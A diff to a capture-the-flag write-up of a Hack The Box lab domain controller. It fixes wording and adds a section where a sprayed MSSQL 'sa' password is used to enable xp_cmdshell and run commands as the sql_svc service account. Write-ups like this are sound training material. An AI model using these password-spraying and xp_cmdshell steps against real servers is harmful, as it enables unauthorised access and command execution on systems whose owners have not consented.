@@ -151,7 +151,7 @@ The domain `sequel.htb` and the DC `DC01.sequel.htb` appear across multiple serv
 
 <br />
 
-# Start Credentials:
+# Initial Credentials:
 
 <br />
 
@@ -178,7 +178,7 @@ SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019
 
 <br />
 
-Apparently, we're dealing with a `Windows Server 2019` and `17763` Build Version.
+The host is running `Windows Server 2019`, build 17763.
 
 We can also confirm that the domain is `sequel.htb`.
 
@@ -366,9 +366,9 @@ SMB         10.10.11.51     445    DC01             [-] sequel.htb\sa:MSSQLP@ssw
 
 <br />
 
-There is a match for the user `oscar`, but not interesting SMB shares are available for this account.
+There is a match for the user `oscar`, but no interesting SMB shares are available for this account.
 
-We can run the same spray attack over `mssql`:
+We can run the same spray attack against `mssql`:
 
 <br />
 
@@ -397,7 +397,7 @@ MSSQL       10.10.11.51     1433   DC01             [+] DC01\sa:MSSQLP@ssw0rd! (
 
 We have valid credentials for the `sa` account! (system administrator)
 
-At this point, we can log in mssql server using `mssqlclient.py`:
+We can log into the `MSSQL` server using `mssqlclient.py`:
 
 <br />
 
@@ -418,3 +418,56 @@ SQL (sa  dbo@master)>
 ```
 
 <br />
+
+## xp_cmdshell:
+
+<br />
+
+At this point, there is an interesting feature in `MSSQL` servers called `xp_cmdshell`.
+
+It can allow us to run commands into the system.
+
+However, if we try to run a command:
+
+<br />
+
+```bash
+SQL (sa  dbo@master)> xp_cmdshell whoami
+[-] ERROR(DC01\SQLEXPRESS): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
+```
+
+<br />
+
+Error! The `xp_cmdshell` utility is disabled.
+
+But we're `sa`, so we can enabled it without problems:
+
+<br />
+
+```bash
+SQL (sa  dbo@master)> enable_xp_cmdshell
+[*] INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
+[*] INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
+```
+
+<br />
+
+And run a command:
+
+<br />
+
+```bash
+SQL (sa  dbo@master)> xp_cmdshell whoami
+output           
+--------------   
+sequel\sql_svc   
+
+NULL
+```
+
+<br />
+
+Commands are being executed as the `sql_svc` user.
+
+<br />
+
